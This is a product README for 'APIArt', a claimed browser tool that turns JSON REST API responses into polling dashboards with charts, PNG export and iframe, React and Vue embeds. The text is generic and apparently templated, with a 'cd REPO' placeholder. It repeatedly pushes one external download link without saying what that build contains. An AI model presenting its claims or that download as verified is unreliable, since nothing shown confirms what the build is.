# APIArt - API Dashboard 2026

> **APIArt turns JSON REST API responses into live web dashboards with streaming visualizations, polling, telemetry, and embeddable results.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ethan-woodou6920/apiart-api-dashboard?style=flat-square)](https://github.com/ethan-woodou6920/apiart-api-dashboard)

---

<p align="center">
  <a href="https://ethan-woodou6920.github.io/apiart-api-dashboard/">
    <img src="https://img.shields.io/badge/Download-APIArt%20Latest-brightgreen?style=for-the-badge" alt="Download APIArt">
  </a>
</p>

> **[Download APIArt Current Build](https://ethan-woodou6920.github.io/apiart-api-dashboard/)**

---

[Download Latest Build](https://ethan-woodou6920.github.io/apiart-api-dashboard/)

---

## Overview

APIArt is a browser workspace for converting JSON REST API data into dashboards that update continuously. Instead of working only with raw responses, you can use schema inference, metric discovery, telemetry collection, and live polling to examine the data through charts and responsive visual arrangements.

Its processing layer is built with Rust and WebAssembly, while Cloudflare Workers provide edge proxy support. The resulting dashboards can also be used outside the primary interface through HTML iframe widgets, React components, Vue components, and Retina PNG exports.

---

## Capabilities

- Builds inferred JSON schemas from API responses to simplify dashboard configuration.
- Finds metrics using zero-copy processing methods.
- Polls APIs continuously for views that stay current.
- Records rate-limit headers together with response telemetry.
- Includes a Cloudflare Edge proxy for supported API access workflows.
- Uses scalable SVG charts and responsive layouts for rendering.
- Produces Retina PNG files from visualizations.
- Supports HTML iframe embeds as well as React and Vue components.

---

## Getting Started

### Use the web build

1. Visit the [latest APIArt build](https://ethan-woodou6920.github.io/apiart-api-dashboard/).
2. Open the dashboard in a current web browser.
3. Enter a JSON REST API endpoint and set up the polling workflow.
4. Inspect the inferred schema, identified metrics, and resulting visualizations.

### Check out the repository

```bash
git clone https://github.com/ethan-woodou6920/apiart-api-dashboard.git
cd REPO
```

Depending on the contents of the build, open its web entry point directly in a browser or serve the repository with a local static web server.

---

## Typical Workflow

APIArt can be used in the following sequence:

1. Launch APIArt in a browser.
2. Supply the JSON REST API endpoint to connect.
3. Allow the response schema to be inferred.
4. Choose the fields or metrics that should appear visually.
5. Turn on live polling for recurring refreshes.
6. Examine telemetry, including captured rate-limit headers.
7. Export the selected chart as a Retina PNG or place it into another page.
8. Integrate the dashboard through an iframe, React component, or Vue component as needed.

---

## Configuration

The web dashboard manages the main APIArt settings, while embedded deployments use their integration code. The relevant options may include:

```text
API endpoint       JSON REST API URL
Polling interval   Refresh cadence for live data
Proxy              Cloudflare Edge proxy, when required
Visualization      Metrics, chart type, and responsive layout
Embedding          HTML iframe, React, or Vue integration
Export             Retina PNG output settings
```

When embedding a dashboard, configure the endpoint, polling behavior, layout, and visualization choices within the host application's integration layer.

---

## Requirements

- A modern browser that supports WebAssembly.
- Reachability of the JSON REST API used for visualization.
- Network access for live polling and edge-proxy workflows.
- Cloudflare Workers access for the Cloudflare Edge proxy.
- An HTML environment for iframe widgets.
- React or Vue for the matching component integrations.
- A local static web server can be useful for serving the repository build locally.

---

## Frequently Asked Questions

### Which API data can APIArt visualize?

APIArt works with JSON REST APIs. It can derive schemas from their responses and locate metrics suitable for dashboard views.

### Will the dashboard refresh on its own?

Yes. Enable live polling and choose the interval at which API data should be refreshed.

### What telemetry is available?

APIArt provides telemetry-related functionality, including rate-limit header capture and metric visualization.

### Are embedded dashboards supported?

Yes. You can use an HTML iframe widget, or integrate through the available React and Vue components.

### What export format is available?

The export workflow creates a Retina PNG image from the chosen visualization.

### What can cause a dashboard to fail to load?

Check the endpoint URL, returned data format, network connectivity, polling configuration, and any proxy settings. The browser must also provide WebAssembly support.

### Where do dashboard settings live?

Settings for the dashboard are managed in the web interface. Embedded component settings belong in the host application's integration code. The current build may also include repository-specific defaults.

### How do I get the latest changes?

Open the [latest build](https://ethan-woodou6920.github.io/apiart-api-dashboard/) for the current published version, and consult the repository for project updates.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
